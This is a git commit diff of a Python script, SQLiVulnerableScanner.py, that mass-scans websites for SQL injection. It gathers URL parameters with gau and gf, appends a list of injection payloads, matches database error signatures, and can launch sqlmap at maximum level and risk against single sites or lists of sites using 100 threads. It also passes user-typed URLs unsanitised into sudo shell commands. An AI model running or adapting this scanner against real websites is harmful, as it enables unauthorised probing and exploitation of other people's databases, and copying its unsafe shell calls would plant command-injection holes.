3730ec601bdc43edb63cc7f48c18d158bdbccd1d
Mr Raihan <36988513+raic0d3r@users.noreply.github.com>
2022-06-18 01:46:03 +0200

    Update SQLiVulnerableScanner.py

--- SQLiVulnerableScanner.py
+++ SQLiVulnerableScanner.py
@@ -1,18 +1,20 @@
 import re, requests, os, sys
-from time import time as timer	
+import html
+from time import time as timer  
 from multiprocessing.dummy import Pool
 from pathlib import Path
-from colorama import Fore								
+from colorama import Fore                               
 from colorama import Style
-####### Colors	 ######	
-fr  =   Fore.RED											
-fc  =   Fore.CYAN											
-fw  =   Fore.WHITE											
-fg  =   Fore.GREEN											
-sd  =   Style.DIM											
-sn  =   Style.NORMAL										
+#from web import web
+####### Colors   ###### 
+fr  =   Fore.RED                                            
+fc  =   Fore.CYAN                                           
+fw  =   Fore.WHITE                                          
+fg  =   Fore.GREEN                                          
+sd  =   Style.DIM                                           
+sn  =   Style.NORMAL                                        
 sb  =   Style.BRIGHT
-										
+                                        
 #######################
 
 def banners():
@@ -46,19 +48,128 @@ def banners():
       `:::::`::::::::;' /  / `:#
        ::::::`:::::;'  /  /   `#                                                                                            
 
-		\n""".format(fg, fr, fg, sn)
-		
+        \n""".format(fg, fr, fg, sn)
+        
     print(banner)
 
+sql_errors = {
+    "MySQL": (r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"MySQL Query fail.*", r"SQL syntax.*MariaDB server"),
+    "PostgreSQL": (r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"Warning.*PostgreSQL"),
+    "Microsoft SQL Server": (r"OLE DB.* SQL Server", r"(\W|\A)SQL Server.*Driver", r"Warning.*odbc_.*", r"Warning.*mssql_", r"Msg \d+, Level \d+, State \d+", r"Unclosed quotation mark after the character string", r"Microsoft OLE DB Provider for ODBC Drivers"),
+    "Microsoft Access": (r"Microsoft Access Driver", r"Access Database Engine", r"Microsoft JET Database Engine", r".*Syntax error.*query expression"),
+    "Oracle": (r"\bORA-[0-9][0-9][0-9][0-9]", r"Oracle error", r"Warning.*oci_.*", "Microsoft OLE DB Provider for Oracle"),
+    "IBM DB2": (r"CLI Driver.*DB2", r"DB2 SQL error"),
+    "SQLite": (r"SQLite/JDBCDriver", r"System.Data.SQLite.SQLiteException"),
+    "Informix": (r"Warning.*ibase_.*", r"com.informix.jdbc"),
+    "Sybase": (r"Warning.*sybase.*", r"Sybase message")
+}
 
+Headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Accept-Encoding': 'gzip, deflate',
+            'Content-Type': 'application/x-www-form-urlencoded'
+        }
+
+def check(html):
+    """check SQL error is in HTML or not"""
+    for db, errors in sql_errors.items():
+        for error in errors:
+            if re.compile(error).search(html):
+                #print "\n" + db
+                return True, db
+    return False, None
+    
 def getoption():
-    url = input("{}[1]{} ENTER WEBSITE : ".format(fg, fw))
+    print("{}[1]{} Single Site".format(fg, fw))
+    print("{}[2]{} Multiple Site".format(fg, fw))
+    choiceoption=input('Put Number => ')
+    if choiceoption=='1':
+        url = input("\n\033[92m[!]\033[91m ENTER WEBSITE : ")
+        start = timer()
+        singlescan(url)
+        print('Finished in : ' + str(timer() - start) + ' seconds')
+        print("\n")
+        if os.stat("logs/sqli_paramaters").st_size == 0:
+            print("\n")
+        else:
+            print("{}[1]{} Advanced Scan".format(fg, fw))
+            print("{}[2]{} No Thanks".format(fg, fw))
+            choiceoptions=input('Put Number => ')
+            if choiceoptions=='1':
+                print("{}{}Checking if the entry points are vulnerable...{}\n\n" .format(sn, fc, sn))
+                os.system("sqlmap -m logs/sqli_paramaters.txt -v 3 --batch --random-agent --level 5 --risk 3 | tee -a sqli.txt")
+            elif choiceoptions=='2':
+                exit()
+
+    elif choiceoption=='2':
+        start_raw = input("\n\033[92m[!]\033[91m ENTER LIST OF WEBSITES : ")
+        try:
+            with open(start_raw, 'r') as f:
+                url = f.read().splitlines()
+        except IOError:
+            pass
+        start = timer()
+        ThreadPool = Pool(100)
+        Threads = ThreadPool.map(multiplescan, url)
+        print('PrivateBot Finished in : ' + str(timer() - start) + ' seconds')
+        print("\n")
+        if os.stat("logs/sqli_paramaters").st_size == 0:
+            print("\n")
+        else:
+            print("{}[1]{} Advanced Scan".format(fg, fw))
+            print("{}[2]{} No Thanks".format(fg, fw))
+            choiceoptions=input('Put Number => ')
+            if choiceoptions=='1':
+                print("{}{}Checking if the entry points are vulnerable...{}\n\n" .format(sn, fc, sn))
+                os.system("sqlmap -m logs/sqli_paramaters.txt -v 3 --batch --random-agent --level 5 --risk 3 | tee -a sqli.txt")
+            elif choiceoptions=='2':
+                exit()
+
+def singlescan(url):
     print("\n{}[+] Vulnerability: SQLi{}\n".format(fg, sn))
     print("{}{}Finding SQLi entry points in the domain...{}\n\n".format(sn, fc, sn))
-    os.system("gau "+url+"| gf sqli | tee sqli_paramaters.txt")
+    os.system("sudo gau "+url+"| gf sqli | tee logs/sqli_paramaters")
     print("\n")
-    print("{}{}Checking if the entry points are vulnerable...{}\n\n" .format(sn, fc, sn))
-    os.system("sqlmap -m sqli_paramaters.txt -v 3 --batch --random-agent --level 5 --risk 3 | tee -a sqli.txt")
+    if os.stat("logs/sqli_paramaters").st_size == 0:
+        print("{}{}[😞]Not Found SQLi entry points in the domain...{}\n\n" .format(sn, fc, sn))
+    else:
+        print("{}{}[😍]Checking if the entry points are vulnerable...{}\n\n" .format(sn, fc, sn))
+        domain = open("logs/sqli_paramaters", 'r').read().splitlines()   
+        for domain in domain:
+            payloads = ("'", "')", "';", '"', '")', '";', '`', '`)', '`;', '\\', "%27", "%%2727", "%25%27", "%60", "%5C")
+            for payload in payloads:
+                website = domain + payload
+                r = requests.get(website, headers=Headers ,timeout=10)
+                source = html.unescape(r.text)
+                if source:
+                    vulnerable, db = check(source)
+                    if vulnerable and db != None:
+                        print("\n{}[✓] Vulnerable =>{}{}\n".format(fg, website, sn))
+                        open('SQLiVulnerable.txt', 'a').write(website+'\n')
+
+def multiplescan(url):
+    print("\n{}[+] Vulnerability: SQLi{}\n".format(fg, sn))
+    print("{}{}Finding SQLi entry points in the domain...{}\n\n".format(sn, fc, sn))
+    os.system("sudo gau "+url+"| gf sqli | tee logs/sqli_paramaters")
+    print("\n")
+    if os.stat("logs/sqli_paramaters").st_size == 0:
+        print("{}{}[😞]Not Found SQLi entry points in the domain...{}\n\n" .format(sn, fc, sn))
+    else:
+        print("{}{}[😍]Checking if the entry points are vulnerable...{}\n\n" .format(sn, fc, sn))
+        domain = open("logs/sqli_paramaters", 'r').read().splitlines()   
+        for domain in domain:
+            payloads = ("'", "')", "';", '"', '")', '";', '`', '`)', '`;', '\\', "%27", "%%2727", "%25%27", "%60", "%5C")
+            for payload in payloads:
+                website = domain + payload
+                r = requests.get(website, headers=Headers ,timeout=10)
+                source = html.unescape(r.text)
+                if source:
+                    vulnerable, db = check(source)
+                    if vulnerable and db != None:
+                        print("\n{}[✓] Vulnerable =>{}{}\n".format(fg, website, sn))
+                        open('SQLiVulnerable.txt', 'a').write(website+'\n')
 
 def installreq():
     print("\n{}[+] Installing Requirement{}\n".format(fg, sn))
